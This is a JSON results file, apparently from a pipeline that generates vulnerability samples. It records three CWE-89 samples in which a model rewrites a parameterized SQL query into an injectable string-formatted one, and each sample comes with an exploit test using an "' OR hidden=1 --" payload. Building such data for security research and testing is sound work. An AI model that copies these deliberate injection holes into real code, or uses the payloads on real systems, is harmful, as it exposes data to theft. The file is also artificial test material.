@@ -1,0 +1,126 @@
+{
+  "model": "deepseek/deepseek-v4.1-flash",
+  "provider": "openrouter",
+  "n_per_cwe": 3,
+  "seconds": 123,
+  "max_tokens": 8000,
+  "reasoning": "off",
+  "per_cwe": {
+    "CWE-89": {
+      "generated": 3,
+      "accepted": 0,
+      "distinct_accepted": 0,
+      "unjudged": 3,
+      "reasons": {
+        "old_found_unjudged": 3
+      }
+    }
+  },
+  "samples": [
+    {
+      "cwe": "CWE-89",
+      "i": 0,
+      "status": "old_found_unjudged",
+      "old": "        q = request.args.get(\"q\", \"\")\n        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE ?\",\n            (f\"%{q}%\",),\n        ).fetchall()",
+      "new": "        q = request.args.get(\"q\", \"\")\n        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE '%{}%'\".format(q.replace(\"'\", \"''\"))\n        ).fetchall()",
+      "exploit_test": "from app import create_app\n\n\ndef test_search_injection_leaks_hidden_product_name_via_like_wildcard_bypass():\n    client = create_app().test_client()\n    payload = \"x' OR hidden=1 -- \"\n    quoted = __import__('urllib').parse.quote(payload)\n    resp = client.get(f\"/products?q={quoted}\")\n    body = resp.get_data(as_text=True)\n    assert resp.status_code == 200\n    assert \"INTERNAL-RECIPE-DRAFT\" in body",
+      "served_by": {
+        "model": "deepseek/deepseek-v4.1-flash",
+        "provider": "OpenInference",
+        "usage": {
+          "prompt_tokens": 925,
+          "completion_tokens": 268,
+          "total_tokens": 1193,
+          "cost": 0.00014379,
+          "is_byok": false,
+          "prompt_tokens_details": {
+            "cached_tokens": 898,
+            "cache_write_tokens": 0,
+            "audio_tokens": 0,
+            "video_tokens": 0
+          },
+          "cost_details": {
+            "upstream_inference_cost": 0.00014379,
+            "upstream_inference_prompt_cost": 9.79e-06,
+            "upstream_inference_completions_cost": 0.000134
+          },
+          "completion_tokens_details": {
+            "reasoning_tokens": 0,
+            "image_tokens": 0,
+            "audio_tokens": 0
+          }
+        }
+      }
+    },
+    {
+      "cwe": "CWE-89",
+      "i": 1,
+      "status": "old_found_unjudged",
+      "old": "        q = request.args.get(\"q\", \"\")\n        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE ?\",\n            (f\"%{q}%\",),\n        ).fetchall()\n        return jsonify([dict(r) for r in rows])",
+      "new": "        q = request.args.get(\"q\", \"\")\n        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE '%{}%'\".format(q)\n        ).fetchall()\n        return jsonify([dict(r) for r in rows])",
+      "exploit_test": "from app import create_app\n\n\ndef test_exploit_product_search_leaks_hidden_internal_draft():\n    client = create_app().test_client()\n    payload = \"' OR hidden = 1 --\"\n    url = \"/products?q=\" + __import__('urllib.parse').quote(payload)\n    resp = client.get(url)\n    text = resp.get_data(as_text=True)\n    assert resp.status_code == 200\n    assert \"INTERNAL-RECIPE-DRAFT\" in text",
+      "served_by": {
+        "model": "deepseek/deepseek-v4.1-flash",
+        "provider": "OpenInference",
+        "usage": {
+          "prompt_tokens": 925,
+          "completion_tokens": 281,
+          "total_tokens": 1206,
+          "cost": 0.00015233,
+          "is_byok": false,
+          "prompt_tokens_details": {
+            "cached_tokens": 796,
+            "cache_write_tokens": 0,
+            "audio_tokens": 0,
+            "video_tokens": 0
+          },
+          "cost_details": {
+            "upstream_inference_cost": 0.00015233,
+            "upstream_inference_prompt_cost": 1.183e-05,
+            "upstream_inference_completions_cost": 0.0001405
+          },
+          "completion_tokens_details": {
+            "reasoning_tokens": 0,
+            "image_tokens": 0,
+            "audio_tokens": 0
+          }
+        }
+      }
+    },
+    {
+      "cwe": "CWE-89",
+      "i": 2,
+      "status": "old_found_unjudged",
+      "old": "        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE ?\",\n            (f\"%{q}%\",),\n        ).fetchall()",
+      "new": "        rows = db.execute(\n            \"SELECT id, name, price FROM products WHERE hidden = 0 AND name LIKE '%{}%'\".format(q)\n        ).fetchall()",
+      "exploit_test": "from app import create_app\n\n\ndef test_exploit_search_leaks_hidden_product_via_injection():\n    client = create_app().test_client()\n    payload = \"x' OR hidden=1 -- \"\n    quoted = __import__('urllib').parse.quote(payload, safe='') if False else ''\n    # minimal URL-safe construction using stdlib quoting via requests-free approach\n    import urllib.parse\n    url = \"/products?q=\" + urllib.parse.quote(payload, safe='')\n    resp = client.get(url)\n    text = resp.get_data(as_text=True)\n    assert resp.status_code == 200\n    assert \"INTERNAL-RECIPE-DRAFT\" in text",
+      "served_by": {
+        "model": "deepseek/deepseek-v4.1-flash",
+        "provider": "OpenInference",
+        "usage": {
+          "prompt_tokens": 925,
+          "completion_tokens": 269,
+          "total_tokens": 1194,
+          "cost": 0.00014485,
+          "is_byok": false,
+          "prompt_tokens_details": {
+            "cached_tokens": 870,
+            "cache_write_tokens": 0,
+            "audio_tokens": 0,
+            "video_tokens": 0
+          },
+          "cost_details": {
+            "upstream_inference_cost": 0.00014485,
+            "upstream_inference_prompt_cost": 1.035e-05,
+            "upstream_inference_completions_cost": 0.0001345
+          },
+          "completion_tokens_details": {
+            "reasoning_tokens": 0,
+            "image_tokens": 0,
+            "audio_tokens": 0
+          }
+        }
+      }
+    }
+  ]
+}
